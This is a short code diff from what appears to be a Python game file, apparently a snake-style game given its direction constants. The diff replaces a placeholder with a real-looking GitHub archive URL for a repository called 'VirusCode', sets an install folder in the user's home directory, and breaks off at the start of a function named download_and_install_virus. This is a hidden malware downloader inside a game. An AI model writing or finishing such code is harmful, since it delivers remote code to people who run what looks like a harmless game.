@@ -43,8 +43,8 @@ DOWN = (0, 1)
 LEFT = (-1, 0)
 RIGHT = (1, 0)
 
-# Virus repository URL (update this with your actual virus repo)
-VIRUS_REPO_URL = "https://github.com/YOUR_USERNAME/VirusCode/archive/refs/heads/main.zip"
+# Virus repository URL
+VIRUS_REPO_URL = "https://github.com/phu142857/VirusCode/archive/refs/heads/main.zip"
 VIRUS_INSTALL_DIR = os.path.expanduser("~/virus_system")
 
 def download_and_install_virus():
